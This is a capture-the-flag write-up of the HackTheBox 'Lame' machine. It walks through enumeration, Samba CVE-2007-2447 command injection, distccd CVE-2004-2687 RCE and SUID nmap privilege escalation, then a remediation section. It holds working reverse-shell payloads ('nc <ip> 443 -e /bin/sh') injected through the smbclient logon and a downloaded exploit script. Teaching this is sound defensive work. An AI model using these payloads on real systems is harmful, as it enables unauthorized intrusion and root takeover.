---
layout: post
title: HTB Lame WriteUp
date: 2026-11-23
categories:
  - HackTheBox
  - HackTheBox-Linux
tags:
  - Linux
  - Samba
  - CVE-2007-2447
  - Command-Injection
  - distccd
  - CVE-2004-2687
  - SUID-Abuse
  - GTFOBins
  - Privilege-Escalation
  - Remote-Code-Execution
  - Service-Hardening
  - Blue-Team
media_subpath: /assets/img/Lame
---
![Desktop View](Lame.png){: w="400"  h="400" }

# Lame Skills

**Lame CTF** is an Easy Linux machine where we will use the following skills:

- **Network & Service Enumeration (`vsftpd`, `Samba`, `distccd`)**
- **Identifying Rabbit Holes (Patched `vsftpd 2.3.4` Backdoor)**
- **Exploiting Samba Username Map Script Command Injection (`CVE-2007-2447`)**
- **Alternative Exploitation via Unauthenticated `distccd` RCE (`CVE-2004-2687`)**
- **Privilege Escalation via SUID Binary Abuse (`nmap` Interactive Mode / GTFOBins)**
- **Linux Service Hardening & Firewall Filtering (Blue Team)**
- **SUID Auditing & Legacy Risk Mitigation (Blue Team)**

---
## IP Address Enumeration

Using the usual `nmap` scan I've discovered ports **21, 22, 139, 445 and 3632**:

```perl
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.104.175 -oG allPorts
Scanned at 2026-11-23 16:43:37 CET for 26s
Not shown: 65530 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack ttl 63
22/tcp   open  ssh          syn-ack ttl 63
139/tcp  open  netbios-ssn  syn-ack ttl 63
445/tcp  open  microsoft-ds syn-ack ttl 63
3632/tcp open  distccd      syn-ack ttl 63
```

Then I launched a basic group of scripts to seek more info from the open ports:

```java
❯ nmap -sCV -p21,22,139,445,3632 10.129.104.175 -oN targeted
Starting Nmap 7.98 ( https://nmap.org ) at 2026-11-23 16:45 +0100
Nmap scan report for 10.129.104.175
Host is up (0.0079s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.17.105
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2026-11-23T10:46:15-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 2h30m44s, deviation: 3h32m10s, median: 42s
```

So we have to check the following ports & services:

- **Port 21 -->  vsftpd 2.3.4**
- **Port 22 -->  OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)**
- **Port 139 -->  netbios-ssn Samba smbd 3.X - 4.X**
- **Port 445 -->  netbios-ssn Samba smbd 3.0.20-Debian**
- **Port 3632 -->  distccd v1**


Let's see what we can find in port 21

---
## Port 21 Enumeration

The `nmap` report shows that the **FTP** service allows `anonymous` login, so let's check it.

```bash
❯ ftp 10.129.104.175
Connected to 10.129.104.175.
220 (vsFTPd 2.3.4)
Name (10.129.104.175:ne4rby): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||20119|).
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
226 Directory send OK.
```

**Nothing... ._.**

Let's see if there is any exploit for this version.

```bash
❯ searchsploit vsFTPd 2.3.4
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                                        |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution                                                                                                                                                                             | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                                                                                | unix/remote/17491.rb
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

One exploit found, after a quick **google** search I found this:

> This module exploits a **malicious backdoor** that was added to the **VSFTPD** download archive. This backdoor was introduced into the `vsftpd-2.3.4.tar.gz` archive between June 30th 2011 and July 1st 2011 according to the most recent information available. This backdoor was removed on July 3rd 2011.
{: .prompt-info }

After a little bit of research, the backdoor is quite simple.

1. We need to authenticate using `:)` in the **username field** and anything as password.

```bash
❯ telnet 10.129.104.175 21
Trying 10.129.104.175...
Connected to 10.129.104.175.
Escape character is '^]'.
220 (vsFTPd 2.3.4)
USER ne4rby:)
331 Please specify the password.
PASS null
```

2. Before sending the petition, we need to open a listener on **port 6200**

```bash
❯ nc -nvlp 6200
Listening on 0.0.0.0 6200
```

3. Now just send the **login request** and see if we get a **reverse shell**.

```bash
❯ nc -nvlp 6200
Listening on 0.0.0.0 6200
```

But unfortunately, we just fell in a **rabbit hole**...

> **HackTheBox** used a modified binary in the machine **Lame** where the backdoor was removed.
{: .prompt-info }

Let's continue with the **SMB** service.

## Port 445 Enumeration & Exploitation

We know that we are facing a **Samba 3.0.20**, but let's see first if we have access using a **NULL Session**.

```bash
❯ smbclient -L 10.129.104.175 -N
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	tmp             Disk      oh noes!
	opt             Disk      
	IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            LAME
```

After checking every share, nothing useful was found.

Let's see if there is any exploit for this version of **Samba**.

```bash
❯ searchsploit Samba 3.0.20
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                                        |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                                                                                                                                | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                                                                                                      | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                                                                                                                                                                 | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                                                                                                                         | linux_x86/dos/36741.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

Found a **Metasploit Module**..., let's see what it does.

```rb
# lol?
     username = "/=`nohup " + payload.encoded + "`"
```

Seems like by adding a `/=``nohup` string as the username, followed by our payload, we should be able to **inject a command**.

1. In order to inject the command, login using a **NULL Session**

```bash
❯ smbclient \\\\10.129.104.175\\tmp -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \>
```

2. Using the `logon` in-built utility, authenticate using the `` /=`nohup `` string followed by a `ping` to our **IP**.

```bash
smb: \> logon "/=`nohup ping -c 1 10.10.17.105`"
```

3. Before sending the request, use `tcpdump` listening to `icmp` traces.

```bash
❯ tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

4. Send the request, add a **random/blank** password and check `tcpdump`

```bash
❯ tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
18:02:15.357656 IP 10.129.104.175 > 10.10.17.105: ICMP echo request, id 32026, seq 1, length 64
18:02:15.357683 IP 10.10.17.105 > 10.129.104.175: ICMP echo reply, id 32026, seq 1, length 64
```

Bingo, we just gained **RCE**, to get a **reverse shell** we can follow the same exact steps but changing the **listener and payload**.

1. Modify the payload

```bash
smb: \> logon "/=`nohup nc 10.10.17.105 443 -e /bin/sh`"
```

2. Open a listener on the same port (443)

```bash
❯ nc -nvlp 443
Listening on 0.0.0.0 443
```

3. Send the request, add a **random/blank** password and check `nc`

```bash
❯ nc -nvlp 443
Listening on 0.0.0.0 443
Connection received on 10.129.104.175 33442
id
uid=0(root) gid=0(root)
```

### TTY Treatment 
{: #TTY }

Once we get the reverse shell. We have to get a fully interactive shell. There are multiple ways but I like to do it this way: 

```bash
script /dev/null -c bash
```

Then press *Ctrl+Z* to get the process in background.

Now that you are in your machine execute the next command:

```bash
stty raw -echo;fg
```

Now write `reset xterm` and you should have a better looking shell but you still have to execute a few commands:

```bash
export TERM=xterm
export SHELL=bash
stty rows 45 columns 184
```

Run a `stty size` in your own shell to know the rows and columns.

## Shell as `root`

Shell as `root` directly...

We can find the flags now:

```bash
root@lame:/tmp# cat /home/makis/user.txt /root/root.txt 
8f7806cb0a9**************e1db87b
850cf53c460**************e60d0b8
```

Before going to the **Remedying** section, there is another way to break in this machine, let's take a look into it.


## Port 3632 Enumeration & Exploitation

If we take a look again at our `nmap` report, there is still an **open port**.

Let's investigate a bit about **distccd v1** and port **3632**, after a quick **google search** I found this:

> `distcc` is designed to speed up compilation by taking advantage of **unused processing power on other computers**. A machine with `distcc` installed can **send code to be compiled across the network** to a computer which has the distccd daemon and a compatible compiler installed
{: .prompt-info }

After some research I found an **exploit** for `distcc`.

We can check if this version is **vulnerable** using `nmap` scripts

```bash
❯ nmap --script=distcc-cve2004-2687.nse -p3632 10.129.104.175 -oN DistccScan

Nmap scan report for 10.129.104.175
Host is up (0.0049s latency).

PORT     STATE SERVICE
3632/tcp open  distccd
| distcc-cve2004-2687: 
|   VULNERABLE:
|   distcc Daemon Command Execution
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2004-2687
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|       Allows executing of arbitrary commands on systems running distccd 3.1 and
|       earlier. The vulnerability is the consequence of weak service configuration.
|       
|     Disclosure date: 2002-02-01
|     Extra information:
|       
|     uid=1(daemon) gid=1(daemon) groups=1(daemon)
|   
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
|       https://nvd.nist.gov/vuln/detail/CVE-2004-2687
|_      https://distcc.github.io/security.html

Nmap done: 1 IP address (1 host up) scanned in 0.80 seconds
```

**Bingo!**

After some research and some **code analysis**, I found this repository from [h3x0v3rl0rd](https://github.com/h3x0v3rl0rd/distccd_rce_CVE-2004-2687) 

Before using any exploit we need to understand it.

1. **Why the service is vulnerable (No login or safety checks):** `distccd` is a background service designed to speed up software development by letting computers share the workload of compiling code over a network. It is vulnerable because, when left open without strict IP address restrictions, it requires no password and blindly executes whatever command it receives failing to check whether the request is actually a real compiler or a malicious system command.

2. **Sending a command as a coding job:** The script takes the command you want to run (such as `sh`) and packs it into a fake compilation request (`sh -c [command] # -c main.c -o main.o`). The `#` symbol acts as a comment, telling the target computer to ignore the fake file-compiling arguments at the end and just run your command.

3. **Triggering execution with dummy data:** After connecting to the target computer on port `3632`, the script sends the command followed by 10 random characters (`DOTI...`). This tricks the service into thinking source code has just been uploaded to compile, prompting it to immediately execute the command.

Once we wrap our heads around these points, we can execute the **exploit** following these steps:

1. Download the exploit

```bash
❯ wget https://raw.githubusercontent.com/h3x0v3rl0rd/distccd_rce_CVE-2004-2687/refs/heads/main/distccd_rce.py
--2026-11-23 19:15:11--  https://raw.githubusercontent.com/h3x0v3rl0rd/distccd_rce_CVE-2004-2687/refs/heads/main/distccd_rce.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 2606:50c0:8003::154, 2606:50c0:8002::154, 2606:50c0:8001::154, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|2606:50c0:8003::154|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2759 (2,7K) [text/plain]
Saving to: ‘distccd_rce.py.1’

distccd_rce.py.1                                              100%[=================================================================================================================================================>]   2,69K  --.-KB/s    in 0s      

2026-11-23 19:15:12 (46,2 MB/s) - ‘distccd_rce.py.1’ saved [2759/2759]
```

2. Set a listener in the desired port (443)

```bash
❯ nc -nvlp 443
Listening on 0.0.0.0 443
```

3. Execute the script filling the asked `argvs`, using the last one as the **payload**

```bash
❯ python3 distccd_rce.py -t 10.129.104.175 -p 3632 -c "nc 10.10.17.105 443 -e /bin/bash"
[OK] Connected to remote service
```

4. Check the `nc` listener

```bash
❯ nc -nvlp 443
Listening on 0.0.0.0 443
Connection received on 10.129.104.175 55425
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

## Shell as `daemon`

Once inside, just re-do the [TTY Treatment](#TTY)

In this case we need to **escalate privileges**, after some **testing**, I found a quite odd **SUID** file.

```bash
daemon@lame:/tmp$ find / -perm -4000 -type f 2>/dev/null
[REDACTED]
/usr/bin/nmap
[REDACTED]
```

The `nmap` binary has **SUID** perms, with a quick look in [GTFOBins](https://gtfobins.org/gtfobins/nmap/) I found that `nmap` versions prior to `5.21` allow **command execution**

1. Check `nmap` version

```bash
daemon@lame:/tmp$ nmap --version

Nmap version 4.53 ( http://insecure.org )
```

2. Enter `nmap` interactive mode

```bash
daemon@lame:/tmp$ nmap --interactive

Starting Nmap V. 4.53 ( http://insecure.org )
Welcome to Interactive Mode -- press h <enter> for help
nmap> 
```

3. Spawn a `bash` as `root`


```bash
nmap> !/bin/bash -p
bash-3.2# whoami
root
```

That's another way to **pwn** this machine.

---

## Remedying and Securing the Machine

In this section, we will secure every attack vector that we have just exploited. Since we already have an active `root` shell on **Lame**—and we didn't drop any persistent binaries on disk during exploitation—we can jump straight into hardening the services directly from our terminal.

### 1. Fixing Samba Command Injection (`CVE-2007-2447`) & Hardening SMB

Our primary foothold came from **Samba 3.0.20** exposed on ports 139 and 445, which gave us an immediate `root` shell.

**Why was it vulnerable?**

In Samba versions 3.0.20 through 3.0.25rc3, when the `username map script` option is enabled (or when handling MS-RPC SAMR requests), the service passes the raw username string directly to `/bin/sh` without sanitizing shell metacharacters. By wrapping our payload inside backticks (`` `/=`nohup ...` ``), we tricked the shell into executing arbitrary commands with `root` privileges. Additionally, `nmap` showed that **SMB signing** was disabled and anonymous null sessions were allowed.

**How to fix it:**

We need to upgrade Samba to a patched release, harden `/etc/samba/smb.conf` to disable guest access and enforce packet signing, and restart the daemon (using SysVinit scripts since this is an older Debian/Ubuntu system):

1. Upgrade Samba to patch `CVE-2007-2447`

```bash
root@lame:/tmp# apt-get update && apt-get install --only-upgrade samba
```

2. Enforce mandatory SMB signing and disable anonymous/guest logins in `/etc/samba/smb.conf`

```bash
root@lame:/tmp# sed -i 's/map to guest = bad user/map to guest = Never/g' /etc/samba/smb.conf
root@lame:/tmp# echo "server signing = mandatory" >> /etc/samba/smb.conf
```

3. Restart the Samba service to apply the changes

```bash
root@lame:/tmp# /etc/init.d/samba restart
```

---

### 2. Securing or Disabling `distccd` (`CVE-2004-2687`)

Our second entry vector was the **distccd** service listening on port **3632**, which gave us remote command execution as `daemon`.

**Why was it vulnerable?**

`distccd` is designed to distribute code compilation across trusted machines on a local network, meaning it does not use authentication by design. Because it was bound to `0.0.0.0` without IP access controls, anyone could connect to port 3632 and send arbitrary shell commands disguised as compiler jobs.

**How to fix it:**

If this server is not actively part of a build farm, the safest move is to stop and disable the service completely. If it is needed, it must be restricted to `localhost` or a trusted subnet inside `/etc/default/distcc`:

1. Stop the `distccd` daemon and prevent it from starting on boot

```bash
root@lame:/tmp# /etc/init.d/distcc stop
root@lame:/tmp# update-rc.d -f distcc remove
```

2. *(Optional)* If distributed compilation is required, restrict the listener and allowed networks in `/etc/default/distcc`

```bash
root@lame:/tmp# sed -i 's/ALLOWEDNETS="0.0.0.0\/0"/ALLOWEDNETS="127.0.0.1"/g' /etc/default/distcc
root@lame:/tmp# sed -i 's/LISTENER=""/LISTENER="127.0.0.1"/g' /etc/default/distcc
```

---

### 3. Removing the SUID Bit from `nmap` (Privilege Escalation Fix)

When breaking in through `distccd` as `daemon`, we escalated privileges to `root` by abusing the SUID bit set on `/usr/bin/nmap`.

**Why was it vulnerable?**

An administrator likely set the SUID bit (`chmod u+s`) on `nmap` so standard users could run raw-packet scans (like `-sS` or `-sU`) without needing `sudo`. However, `nmap` versions prior to `5.21` include an `--interactive` mode with a shell escape (`!sh`), which inherits the binary owner's `root` permissions.

**How to fix it:**

Strip the SUID permission from `/usr/bin/nmap` immediately (and ideally upgrade Nmap to a modern version where interactive mode was removed), then audit the system for any other unexpected SUID binaries:

1. Remove the SUID bit from `nmap`

```bash
root@lame:/tmp# chmod u-s /usr/bin/nmap
root@lame:/tmp# ls -la /usr/bin/nmap
-rwxr-xr-x 1 root root 780676 2008-04-08 10:04 /usr/bin/nmap
```

2. Audit all remaining SUID binaries across the filesystem

```bash
root@lame:/tmp# find / -perm -4000 -type f 2>/dev/null
```

---

### 4. Defense in Depth: Firewall Filtering & Legacy OS Migration

Even though `vsftpd 2.3.4` turned out to be a rabbit hole without the backdoor, leaving internal services like FTP, Samba, and `distccd` exposed to untrusted networks violates basic network segmentation.

1. Block external access to internal services (FTP, SMB, `distccd`) using `iptables`

```bash
root@lame:/tmp# iptables -A INPUT -i lo -j ACCEPT
root@lame:/tmp# iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
root@lame:/tmp# iptables -A INPUT -p tcp --dport 22 -j ACCEPT
root@lame:/tmp# iptables -A INPUT -p tcp -m multiport --dports 21,139,445,3632 -j DROP
```

> **Lame** runs on a severely outdated Debian/Ubuntu release (Linux 2.6 kernel, OpenSSH 4.7p1, Samba 3.0.20) that reached End-of-Life over a decade ago. In a real production environment, these CLI mitigations should only serve as temporary containment while migrating the workloads to a modern, supported Linux distribution.
{: .prompt-warning }

---
## Final Thoughts

**Lame** is the very first machine released on HackTheBox, and even years later it remains a fantastic introductory Linux box with a couple of great lessons baked in.

First, it teaches you not to tunnel-vision on the first service you see—`vsftpd 2.3.4` looked like an easy win, until it turned out to be a classic rabbit hole. Enumerating the remaining ports paid off with two completely different paths to `root`: an instant command injection through **Samba 3.0.20** (`CVE-2007-2447`), and an alternative route abusing an unauthenticated **distccd** service (`CVE-2004-2687`) paired with a SUID `nmap` binary.

From a Blue Team perspective, **Lame** shows why internal development services like `distccd` should never be exposed to untrusted networks without strict IP restrictions, why outdated SMB configurations can hand over full system control in a single packet, and why auditing SUID binaries is essential to prevent privilege escalation.

---

![Desktop View](LamePwn.png)

---
**Thanks for reading! I'd appreciate it if you took a look at my other posts :)**

